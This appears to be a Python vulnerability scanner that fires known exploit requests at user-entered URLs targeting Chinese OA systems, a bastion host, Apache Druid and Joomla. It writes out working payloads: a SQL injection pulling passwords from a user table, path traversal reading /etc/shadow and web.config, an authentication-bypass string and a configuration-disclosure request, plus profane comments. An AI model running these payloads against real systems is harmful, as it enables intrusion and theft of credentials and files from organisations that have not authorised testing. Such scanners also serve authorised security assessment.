from urllib.parse import urlparse, urlunparse

import Bug
from POC import CVE_2020_27986, PocFun, checkPOC
from POC import CNVD_2021_30167
from POC import CVE_2021_36749
from urllib.parse import urlparse

from POC.用友NC目录遍历漏洞 import yonyou_path
from POC.泛微OAV8SQL注入 import fanwei_OA_sql
from POC.龙璟科技_电池能量BEMS任意下载 import BEMS_download
from POC.齐治堡垒机任意用户登录 import qzbl_anylogin
from POC.金和OA_C6任意下载 import jdOA_anydownload
from POC.通达OA2017前台任意用户登录漏洞 import get2017Session, getV11Session
from main import print_green, print_red
import main

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# par = argparse.ArgumentParser(description='未知版本(内测版)')
# par.add_argument('--url', '-u', help='需要扫描的url', default=False)
# par.add_argument('--timeout', '-t', help='指定超时数值,默认为6', default=6, type=int)
# par.add_argument('--thead', '-n', help='线程数,默认为1(暂不开发)', type=int, default=1)
# par.add_argument('--file', '-f', help='批量url文本', default=False)
# par.add_argument('--scraper', '-s', help='自动化爬取url', action='store_true')
# args = par.parse_args()
#
# '''
# 检测这个傻逼是不是输入空的url
# '''
# if args.url is False and args.file is False:
#     hprint(logo=True)
#     par.print_help()
#     exit()

# def fix_url(url):
#     parsed_url = urlparse(url)
#     if not parsed_url.scheme:
#         parsed_url = parsed_url._replace(scheme='http')
#     if not parsed_url.netloc:
#         print_red('[!]URL错误！')
#
#     return urlunparse(parsed_url)

# url = args.url
# timeout = args.timeout
# thead = args.thead
# file = args.file
# scraper = args.scraper

# 检测到的漏洞数
check_num = 0


def parse_url(url):
    try:
        parsed_url = urlparse(url)
        if parsed_url.scheme and parsed_url.netloc:
            return parsed_url.geturl()
        else:
            print_red("[!]URL格式错误")
            return None
    except Exception as e:
        print_red("[!]解析URL时发生错误")
        return None


def check_POC(in_url, timeout=6):
    turl = parse_url(in_url)
    global check_num
    if not turl is None:
        re = CVE_2021_36749.Apache_Druid_any_path(inurl=turl, timeout=timeout)
        re = CNVD_2021_30167.yonyou_nc(url=turl, timeout=timeout)
        re = qzbl_anylogin(url=turl, timeout=timeout)
        re = get2017Session(url=turl, timeout=timeout)
        re = getV11Session(url=turl, timeout=timeout)
        re = checkPOC.poc_check('CVE-2023-23752',
                                turl,
                                '/api/index.php/v1/config/application?public=true',
                                expected_keyword='links',
                                timeout=timeout)
        re = checkPOC.poc_check('一米OA 任意文件读取漏洞',
                                turl,
                                '/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp',
                                expected_keyword='警告非法用户',
                                timeout=timeout)
        re = checkPOC.poc_check('CVE-2020-27986',
                                turl,
                                '/api/settings/values',
                                expected_keyword=['setting', 'key'],
                                timeout=timeout)
        re = checkPOC.poc_check('泛微OAV8SQL注入',
                                turl,
                                '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager',
                                timeout=timeout)
        re = checkPOC.poc_check('用友NC目录遍历',
                                turl,
                                '/NCFindWeb?service=IPreAlertConfigService&filename',
                                timeout=timeout)
        re = checkPOC.poc_check('金和OA-C6任意文件下载',
                                turl,
                                '/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config',
                                timeout=timeout)
        re = checkPOC.poc_check('金蝶OA目录遍历',
                                turl,
                                '/appmonitor/protected/selector/server_file/files?folder=/&suffix=',
                                expected_keyword='total',
                                timeout=timeout)
        re = checkPOC.poc_check('齐治堡垒机任意用户登录',
                                turl,
                                '/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm',
                                expected_keyword='nav_sys_message',
                                timeout=timeout)
        re = checkPOC.poc_check('龙璟科技-电池能量BEMS-任意文件下载漏洞',
                                turl,
                                '/api/downloads?fileName=../../../../../../../../etc/shadow',
                                expected_keyword='::',
                                timeout=timeout)


# def url_check(in_url):
#     main.print_yellow('检测到单链接模式')
#     if scraper:
#         Bug.urlCheck(url=in_url)
#     else:
#         check_POC(in_url)
#
#
# def file_check(in_file):
#     main.print_yellow('检测到批量模式')
#     try:
#         file = open(in_file, 'r')
#         while True:
#             out_url = file.readline()
#             if out_url == '':
#                 break
#             if scraper:
#                 Bug.urlCheck(url=out_url)
#             else:
#                 check_POC(out_url)
#     except IOError as e:
#         main.print_red('读取错误：' + e)
#     except Exception as e:
#         main.print_red('未知错误：' + str(e))


def main():
    print_green('[+]当前模式为OA漏洞扫描')
    print_red('退出请输入"退出/exit"')
    while True:
        url = input('请输入URL: ')
        if '退出' == url or 'exit' == url:
            break
        else:
            check_POC(url)
            print('=' * 10)


if __name__ == '__main__':
    main()

# # 如果file不为空
# if args.file:
#     # 批量检测
#     args.url = False
#     file_check(file)
# if args.url:
#     # 单url检测
#     if args.url and args.file:
#         hprint('不能两个同时检测啊！操你妈')
#         exit()
#     else:
#         url_check(url)
